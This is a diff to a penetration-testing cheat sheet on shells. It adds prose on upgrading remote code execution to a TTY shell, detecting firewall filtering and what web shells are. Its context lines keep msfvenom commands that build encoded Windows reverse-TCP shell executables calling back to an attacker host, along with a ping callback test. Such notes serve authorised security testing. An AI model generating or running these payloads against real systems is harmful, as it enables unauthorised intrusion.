@@ -1,6 +1,16 @@
 # General - Shells
 
+The following note details the procedure and tools that can be used to leverage
+a RCE into a fully TTY shell.  
+
+For Windows credentials (password or hashes) reuse, refer to the
+Active Directory/Credentials Hunting note.
+
 ### Detect firewall filtering
+
+A firewall may be configured on the targeted system to block inbound or outbound
+connection (TCP, UDP, ICMP). If TCP / UDP reverse shell attempts are failing
+but ICMP packets are received from the target, a firewall may be in deployed.
 
 ###### Outgoing traffic blocking
 
@@ -20,9 +30,11 @@ ping -c 4 <IP> &
 python -c 'import os;  os.popen("ping -c 4 <IP> &");"
 ```
 
-If ICMP packets are received but TCP packets aren't then TCP may be blocked.
-
 ### Web Shells
+
+A web shell is a script written in the supported language of the targeted web
+server to be uploaded and executed by the web service. It provides a mean to
+execute system commands on the target.
 
 #### PHP
 
@@ -246,7 +258,6 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT
 # 64 bits
 msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
 ```
-
 
 #### (Optional) TTY
 
